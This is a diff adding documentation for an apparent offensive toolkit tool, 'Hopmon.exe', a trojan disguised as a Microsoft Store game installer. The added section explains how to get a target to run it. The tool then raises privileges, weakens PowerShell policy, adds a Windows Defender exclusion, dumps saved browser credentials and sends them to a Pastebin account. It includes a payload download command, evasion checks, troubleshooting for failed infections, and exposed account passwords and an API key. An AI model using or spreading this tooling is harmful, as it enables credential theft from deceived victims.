@@ -227,3 +227,95 @@ The trick consistes in adding %TMP% directory to WD ExclusionPath, then Download
 Invoke-Exclusions.ps1 cmdlet will take care of adding the exclusion, download PE, execute PE (mspass.exe).
 Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -Uri parameter) at the end of execution.
 ```
+
+<br />
+
+
+## Hopmon.exe
+   
+|Binary Name|Description|Privileges|Notes|
+|---|---|---|---|
+|Hopmon|dumps credentials from major browsers|Administrator|lll|
+
+<br />
+
+**Description:**<br />
+This project uses [winget](https://learn.microsoft.com/en-us/windows/package-manager/winget/) to install Hopmon game from microsoft store,<br />
+then dumps all browsers credentials stored from memory and send them to<br />
+the website: https://pastebin.com/u/pedro_testing where we can review them.<br />
+
+This project contains Hopmon.exe Hopmon.ps1 and Hopmon.vbs but we<br />
+only need to send Hopmon.exe to target user and convince him to execute it.<br />
+
+<br />
+
+- Hopmon.exe execution flow
+  * It asks for administrator privileges to run (UAC)
+  * It modifies powershell execution policy to UnRestricted
+  * It downloads Hopmon.ps1 script into %TEMP% directory
+  * Executes Hopmon.ps1 in background (hidden) process (orphan)
+
+- Hopmon.ps1 execution flow
+  * Installs Hopmon game from microsoft store.
+  * Creates %TMP% directory exclusion in windows Defender
+  * Dumps credentials from all installed browsers (%TEMP%)
+  * Sends credentials dump to our account in PasteBin.com
+  * It deletes itself (Hopmon.ps1) in the end of execution
+
+<br />
+
+**prerequesites checks:**
+```powershell
+#Make sure Windows Defender service its running
+[bool](Get-Service -Name "WinDefend")
+
+#Make sure we have administrator privileges in shell
+[bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -Match "S-1-5-32-544")
+
+#Make sure required modules are present\loaded
+[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
+[bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Remove-MpPreference")
+```
+
+<br />
+
+**Download Project:**
+```powershell
+iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/Hopmon.rar" -OutFile "Hopmon.rar"
+```
+
+<br />
+
+**Final Notes**
+```
+**ACCESS-PASTEBIN-TO-REVIEW-CREDENTIALS-DUMP:**<br />
+  * The attacker needs to access URL : https://pastebin.com/u/pedro_testing
+  * The attacker needs to login with username : pedro_testing
+  * The attacker needs to login with password : angelapastebin
+   - [The attacker can now review the contents of logfiles] -
+
+.WHAT-CAN-GO-WRONG?
+   * The target did not execute Hopmon.exe with admin
+     privileges when the EXE program asks for UAC access (admin)
+   * The target as a diferent anti-virus instaled besides windows defender (default)
+     and the probability of this scripts bypass other anti-virus detection its smaller.
+   * The target uses a web browser not supported by this project so it can not dump is credentials
+     Browsers supported are: Chromium, Chrome, Firefox, IE, MEdge, Safari, Opera 
+
+.FINAL-NOTES
+   * How to install a diferent game\program ?
+     a) Edit Hopmon.vbs script
+     b) Search inside the file for '-file Hopmon.ps1'
+     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
+     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+
+   * How to list WinGet (microsoft store) games available ?
+     Winget search games
+
+   * How to use a diferent pastebin account ?
+     a) Edit Hopmon.vbs script
+     b) Search inside the file for '-file Hopmon.ps1'
+     c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t-3xp10it -PasteBinPassword angela -PastebinDeveloperKey 1ab4a1a4e39c94db4'
+     d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+
+```
